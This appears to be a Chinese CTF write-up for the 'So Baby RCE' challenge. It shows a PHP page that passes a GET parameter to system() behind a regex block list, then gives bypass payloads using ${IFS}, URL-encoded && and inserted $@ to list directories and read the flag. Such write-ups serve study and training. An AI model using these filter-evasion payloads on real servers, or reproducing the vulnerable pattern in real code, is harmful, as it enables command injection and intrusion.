---
title: '[NewStarCTF 公开赛赛道]So Baby RCE'
date: 2025-02-20 21:33:50
tags: rce
categories: 刷题笔记
---

## [NewStarCTF 公开赛赛道]So Baby RCE

```
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

过滤了很多函数，但没有过滤ls和cd

我们可以跳级来查看目录

由于过滤了空格，我们用`${IFS} $IFS $IFS$a `

```
?cmd=cd$IFS..&&ls     &&连接符先执行前面的后执行后面的
```

但并没有回显

 PHP的system函数和Web服务器如何处理URL编码的参数。当您通过URL传递参数时，Web服务器或PHP通常会对这些参数进行URL解码，将它们转换为相应的字符。这意味着，当您在URL中使用 %26%26 时，它会被解码为 &&，然后传递给 system 函数。

然而，如果 && 在URL中没有被正确解码，或者在某些情况下被解释为URL的一部分而不是命令的一部分，那么它可能不会被传递给 system 函数，因此不会有回显。

我们跳多级来看文件.

```
/?cmd=cd$IFS..%26%26cd${IFS}..%26%26cd${IFS}..%26%26ls
```

![image-20250220215334141](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202502202153358.png)

到这里要查看ffff的内容cat被过滤可以

```
?cmd=cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26tac${IFS}ffff$@llllaaaaggggg
```

得到flag

